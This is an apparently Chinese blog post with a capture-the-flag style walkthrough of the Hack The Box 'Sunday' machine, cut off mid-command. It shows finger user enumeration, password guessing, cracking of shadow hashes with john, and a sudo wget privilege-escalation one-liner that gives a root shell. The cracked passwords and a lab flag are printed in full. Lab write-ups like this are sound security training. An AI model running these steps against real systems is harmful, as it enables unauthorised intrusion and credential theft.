@@ -1,0 +1,774 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：finger枚举、密码猜解、.bash_history敏感信息泄露、hash破解、wget提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sunday-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/05/Sunday-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：finger枚举、密码猜解、.bash_history敏感信息泄露、hash破解、wget提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Sunday-htb-writeup/1.png">
+<meta property="article:published_time" content="2023-12-05T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-05T14:27:26.662Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Sunday-htb-writeup/1.png">
+  
+  
+  
+  <title>Sunday-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Sunday-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-05 23:50" pubdate>
+          2023年12月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Sunday-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：finger枚举、密码猜解、.bash_history敏感信息泄露、hash破解、wget提权</p>
+<span id="more"></span>  
+
+<p>参考链接：官方引导模式、官方writeup</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：<strong>10.10.10.76</strong></p>
+<p>2、使用nmap对靶机进行端口扫描，这里使用我编写的bash脚本进行跑一遍，避免过多的命令输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop/HTB-Tools-Kali/htb-portscan]<br>└─$ ./htb-portscan.sh 10.10.10.76 tcp<br>开始对 10.10.10.76 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.10.76&quot;</span> -oG <span class="hljs-string">&quot;10.10.10.76&quot;</span>-tcp-braker-allports<br>PORT      STATE SERVICE<br>79/tcp    open  finger<br>111/tcp   open  rpcbind<br>515/tcp   open  printer<br>6787/tcp  open  smc-admin<br>22022/tcp open  unknown<br><br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本探测...<br>sudo nmap -sT -sV -O -p<span class="hljs-string">&quot;79,111,515,6787,22022,&quot;</span> <span class="hljs-string">&quot;10.10.10.76&quot;</span><br>PORT      STATE SERVICE  VERSION<br>79/tcp    open  finger?<br>111/tcp   open  rpcbind  2-4 (RPC <span class="hljs-comment">#100000)</span><br>515/tcp   open  printer?<br>6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>o mod_wsgi/<span class="hljs-number">4.5</span>.<span class="hljs-number">1</span> Python/<span class="hljs-number">2.7</span>.<span class="hljs-number">14</span>)<br><span class="hljs-number">22022</span>/tcp open  ssh      OpenSSH <span class="hljs-number">7.5</span> (protocol <span class="hljs-number">2.0</span>)<br><br>* 正在对开放的端口进行nmap漏洞脚本脚本扫描...<br>sudo nmap --script=vuln -p&quot;<span class="hljs-number">79</span>,<span class="hljs-number">111</span>,<span class="hljs-number">515</span>,<span class="hljs-number">6787</span>,<span class="hljs-number">22022</span>,&quot; &quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span>&quot;<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     <span class="hljs-number">224.0</span>.<span class="hljs-number">0.251</span><br>|   After NULL UDP avahi packet DoS (CVE-<span class="hljs-number">2011</span>-<span class="hljs-number">1002</span>).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span><br>Host is up (<span class="hljs-number">0.34</span>s latency).<br><br>──(kali㉿kali-linux-<span class="hljs-number">2022</span>-<span class="hljs-number">2</span>)-[~/Desktop/HTB-Tools-Kali/htb-portscan]<br>└─$ ./htb-portscan.sh <span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span> udp<br>开始对 <span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span> 进行nmap端口扫描...<br>* 正在执行udp协议的端口扫描探测...<br>sudo nmap -min-rate <span class="hljs-number">10000</span> -p- -sU &quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span>&quot; -oG &quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span>&quot;-udp-braker-allports<br>PORT    STATE SERVICE<br><span class="hljs-number">111</span>/udp open  rpcbind<br><br>* 正在对开放的端口进行udp式版本探测和系统版本探测...<br>sudo nmap -sV -sU -O -p&quot;<span class="hljs-number">111</span>,&quot; &quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span>&quot;<br>PORT    STATE SERVICE VERSION<br><span class="hljs-number">111</span>/udp open  rpcbind <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br><br>* 正在对开放的端口进行nmap漏洞脚本脚本扫描...<br>sudo nmap --script=vuln -sU -p&quot;<span class="hljs-number">111</span>,&quot; &quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">10.76</span>&quot;<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     <span class="hljs-number">224.0</span>.<span class="hljs-number">0.251</span><br>|   After NULL UDP avahi packet DoS (CVE-<span class="hljs-number">2011</span>-<span class="hljs-number">1002</span>).<br>|_  Hosts are all up (not vulnerable).<br></code></pre></td></tr></table></figure>
+
+<p>3、打开 <code>10.10.10.76:6787</code>是一个登录页面</p>
+<p><img src="http://sh1yan.top/photo/Sunday-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、通过百度搜索到一些默认口令信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Oracle Solaris 的默认用户登录名和密码是jack。成为 root 用户。root 密码是solaris。<br></code></pre></td></tr></table></figure>
+
+<p>5、但是经过尝试，密码并不是这个，然后我又进行目录扫描，同样的也没有发现什么有价值的信息。</p>
+<p>6、那就<code>Trying Harderb</code>吧，继续枚举其他有用的信息，返回刚才的端口扫描结果中，我们看到79端口有一个<code>finger</code>服务，我们看看能枚举到什么信息。</p>
+<p><code>Finger是一个可以用来查找计算机用户信息的程序。它通常列出登录名、全名和可能的其他有关用户的详细信息。这些详细信息可能包括办公地点和电话号码（如果已知）、登录时间、空闲时间、上次阅读邮件的时间以及用户的计划和项目文件。</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~]<br>└─$ finger admin@10.10.10.76<br>Login       Name               TTY         Idle    When    Where<br>adm      Admin                              &lt; .  .  .  . &gt;<br>dladm    Datalink Admin                     &lt; .  .  .  . &gt;<br>netadm   Network Admin                      &lt; .  .  .  . &gt;<br>netcfg   Network Configuratio               &lt; .  .  .  . &gt;<br>dhcpserv DHCP Configuration A               &lt; .  .  .  . &gt;<br>ikeuser  IKE Admin                          &lt; .  .  .  . &gt;<br>lp       Line Printer Admin                 &lt; .  .  .  . &gt;<br><br>┌──(kali㉿kali-linux-2022-2)-[~]<br>└─$ finger root@10.10.10.76<br>Login       Name               TTY         Idle    When    Where<br>root     Super-User            console      &lt;Oct 14, 2022&gt;<br></code></pre></td></tr></table></figure>
+
+<p>7、这里使用 <a target="_blank" rel="noopener" href="https://pentestmonkey.net/tools/user-enumeration/finger-user-enum">finger-user-enum</a> 这个枚举工具进行枚举，看看存在哪些账号信息</p>
+<p>用户名使用这里的 names.txt 文件</p>
+<p><code>/usr/share/dirb/wordlists/others/names.txt</code></p>
+<p><code>/usr/share/wfuzz/wordlist/others/names.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop/HTB-Tools-Kali/finger-user-enum-1.0]<br>└─$ ./finger-user-enum.pl -U names.txt -t 10.10.10.76<br>Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )<br><br> ----------------------------------------------------------<br>|                   Scan Information                       |<br> ----------------------------------------------------------<br><br>Worker Processes ......... 5<br>Usernames file ........... names.txt<br>Target count ............. 1<br>Username count ........... 8607<br>Target TCP port .......... 79<br>Query <span class="hljs-built_in">timeout</span> ............ 5 secs<br>Relay Server ............. Not used<br><br><span class="hljs-comment">######## Scan started at Tue Dec  5 20:08:50 2023 #########</span><br>Access@10.10.10.76: Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..<br>Admin@10.10.10.76: Admin                 &lt; .  .  .  . &gt;..<br>Anne Marie@10.10.10.76: Login       Name               TTY         Idle    When                 ???..<br>Dee dee@10.10.10.76: Login       Name               TTY         Idle    When    W            ???..<br>Ike@10.10.10.76: Login       Name               TTY         Idle    When    Where   &lt; .  .  .  . &gt;..<br>Jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Wh           ???..<br>La verne@10.10.10.76: Login       Name               TTY         Idle    When                 ???..<br>Line@10.10.10.76: Line Printer Admin                 &lt; .  .  .  . &gt;..<br>Message@10.10.10.76: Message Sub               &lt; .  .  .  . &gt;..<br>Miof mela@10.10.10.76: Login       Name               TTY         Idle    When                 ???..<br>Zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    W            ???..<br><span class="hljs-comment">######## Scan completed at Tue Dec  5 20:26:09 2023 #########</span><br>11 results.<br><br>8607 queries <span class="hljs-keyword">in</span> 1039 seconds (8.3 queries / sec)<br><br></code></pre></td></tr></table></figure>
+
+<p>8、实际上，这里我并没有爆破出最终的账号，这里按照官方引导的提示，应该是爆破出 <code>sunny</code> 这个账号的。</p>
+<p>9、其次，由于这个是靶机，一般密码都是靶机的名称，所以到这里就是直接ssh进行连接的过程了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~]<br>└─$ ssh sunny@10.10.10.76 -p 22022<br>(sunny@10.10.10.76) Password: <br>Last login: Tue Dec  5 12:14:05 2023 from 10.10.14.7<br>Oracle Corporation      SunOS 5.11      11.4    Aug 2018<br>sunny@sunday:~$ <span class="hljs-built_in">ls</span><br>LinEnum.sh     local.cshrc    local.login    local.profile<br>sunny@sunday:~$ <span class="hljs-built_in">id</span><br>uid=101(sunny) gid=10(staff)<br>sunny@sunday:~$ <br></code></pre></td></tr></table></figure>
+
+<p>10、但是登录后，我们发现并没有user.txt这个文件，可能不是这个用户，这个只是个初始账号。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunny@sunday:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 30<br>dr-xr-xr-x   4 root     root           4 2021  12月 19 .<br>drwxr-xr-x  25 root     sys           28 12月  5日 11:14 ..<br>drwxr-xr-x   2 root     root           3 2021  12月 19 sammy<br>drwxr-xr-x   2 sunny    staff         10 12月  5日 12:27 sunny<br>sunny@sunday:~$<br></code></pre></td></tr></table></figure>
+
+<p>11、可以看出来应该是去登录呢个 sammy 的账号，接下来就是信息枚举的过程了，我这里是继续使用的 LinEnum.sh 这个工具，传到靶机的过程就不描述了，使用的python3一键服务器传输下载的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunny@sunday:~$ sudo -l<br>用户 sunny 可以在 sunday 上运行以下命令：<br>    (root) NOPASSWD: /root/troll<br>sunny@sunday:~$<br><br>sunny@sunday:~$ <span class="hljs-built_in">cat</span> .bash_history <br>su -<br><span class="hljs-built_in">cat</span> /etc/resolv.conf <br>ps auxwww|grep overwrite<br>sudo -l<br><span class="hljs-built_in">cat</span> /backup/shadow.backup<br>sudo /root/troll<br>su -<br>sudo -l<br>sudo /root/troll<br>ps auxwww<br>top<br>ps auxwww|grep overwrite<br><span class="hljs-built_in">cat</span> /etc/resolv.conf <br>ps auxwww|grep over<br><br>sunny@sunday:~$ <span class="hljs-built_in">cat</span> /backup/shadow.backup<br>mysql:NP:::::::<br>openldap:*LK*:::::::<br>webservd:*LK*:::::::<br>postgres:NP:::::::<br>svctag:*LK*:6445::::::<br>nobody:*LK*:6445::::::<br>noaccess:*LK*:6445::::::<br>nobody4:*LK*:6445::::::<br>sammy:$5$Ebkn8jlK<span class="hljs-variable">$i6SSPa0</span>.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::<br>sunny:$5$iRMbpnBv<span class="hljs-variable">$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3</span>:17636::::::<br>sunny@sunday:~$ <br></code></pre></td></tr></table></figure>
+
+<p>12、通过枚举脚本，我们主要获取到了2个信息，一个是我们可以通过sudo执行 &#x2F;root&#x2F;troll 脚本，一个是我们通过 .bash_history 发现有历史记录 cat &#x2F;backup&#x2F;shadow.backup ，在这个里面有两个账号的密码，可能是别人遗留的，也可能是本来就是这么设计。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ john pwdhash --wordlist=/home/kali/Desktop/rockyou.txt <br>Using default input encoding: UTF-8<br>Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 ASIMD 4x])<br>Remaining 1 password <span class="hljs-built_in">hash</span><br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 2 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>sunday           (sunny) <br>cooldude!        (sammy)     <br>1g 0:00:00:58 DONE (2023-12-05 20:44) 0.01713g/s 3491p/s 3491c/s 3491C/s daddyzgurl..chrystelle<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>13、这里我们成功的爆破出了账号，然后进行登录另一个账号，获取 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ ssh sammy@10.10.10.76 -p 22022                                              <br>(sammy@10.10.10.76) Password: <br>Last login: Wed Apr 13 15:38:02 2022 from 10.10.14.13<br>Oracle Corporation      SunOS 5.11      11.4    Aug 2018<br>-bash-4.4$ <span class="hljs-built_in">id</span><br>uid=100(sammy) gid=10(staff)<br>-bash-4.4$ <span class="hljs-built_in">ls</span><br>user.txt<br>-bash-4.4$ <span class="hljs-built_in">cat</span> user.txt<br>0ac080e3c1696b30f8df907ba9ec28f5<br>-bash-4.4$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>14、这里我们使用python的pty来获取一个交互式的shell界面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-bash-4.4$ <br>-bash-4.4$ python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>bash-4.4$ <br>bash-4.4$ <span class="hljs-built_in">id</span><br>uid=100(sammy) gid=10(staff)<br></code></pre></td></tr></table></figure>
+
+<p>15、然后查看sudo，看看有哪些权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.4$ sudo -l<br>用户 sammy 可以在 sunday 上运行以下命令：<br>    (ALL) ALL<br>    (root) NOPASSWD: /usr/bin/wget<br>bash-4.4$<br></code></pre></td></tr></table></figure>
+
+<p>16、可以看到我们可以通过wget来进行提权，这里直接使用 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wget/">wget | GTFOBins</a> 这里的方法，进行提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.4$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>bash-4.4$ <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$TF</span><br>bash-4.4$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/sh\n/bin/sh 1&gt;&amp;0&#x27;</span> &gt;<span class="hljs-variable">$TF</span><br>bash-4.4$ sudo wget --use-askpass=<span class="hljs-variable">$TF</span> 0<br>root@sunday:/home/sammy<span class="hljs-comment"># </span><br>root@sunday:/home/sammy<span class="hljs-comment"># cd /root/</span><br>root@sunday:~<span class="hljs-comment"># ls</span><br>overwrite       root.txt        troll           troll.original<br>root@sunday:~<span class="hljs-comment"># cat root.txt 